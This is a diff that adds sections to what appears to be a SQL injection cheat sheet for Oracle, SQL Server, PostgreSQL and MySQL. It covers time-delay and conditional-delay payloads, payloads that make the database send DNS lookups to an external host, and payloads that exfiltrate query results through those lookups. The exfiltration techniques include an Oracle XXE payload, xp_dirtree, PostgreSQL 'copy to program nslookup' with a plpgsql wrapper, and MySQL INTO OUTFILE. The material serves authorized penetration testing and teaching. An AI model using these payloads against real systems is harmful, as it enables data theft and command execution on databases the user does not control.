@@ -107,3 +107,73 @@ MySQL  `QUERY-1-HERE; QUERY-2-HERE`
 #### Note
 
 With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+
+Time delays
+-----------
+
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+
+Oracle  `dbms_pipe.receive_message(('a'),10)` 
+
+Microsoft  `WAITFOR DELAY '0:0:10'` 
+
+PostgreSQL  `SELECT pg_sleep(10)` 
+
+MySQL  `SELECT sleep(10)` 
+
+Conditional time delays
+-----------------------
+
+You can test a single boolean condition and trigger a time delay if the condition is true.
+
+Oracle  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` 
+
+Microsoft  `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` 
+
+PostgreSQL  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` 
+
+MySQL  `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` 
+
+DNS lookup
+----------
+
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+
+Oracle  The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\
+`SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
+
+The following technique works on fully patched Oracle installations, but requires elevated privileges:\
+`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
+
+Microsoft  `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` 
+
+PostgreSQL  `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` 
+
+MySQL  The following techniques work on Windows only:\
+`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`\
+`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` 
+
+DNS lookup with data exfiltration
+---------------------------------
+
+You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+
+Oracle  `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` 
+
+Microsoft  `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` 
+
+PostgreSQL  `create OR replace function f() returns void as $$\
+declare c text;\
+declare p text;\
+begin\
+SELECT into p (SELECT YOUR-QUERY-HERE);\
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\
+execute c;\
+END;\
+$$ language plpgsql security definer;\
+SELECT f();` 
+
+MySQL  The following technique works on Windows only:\
+`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` 
+
+
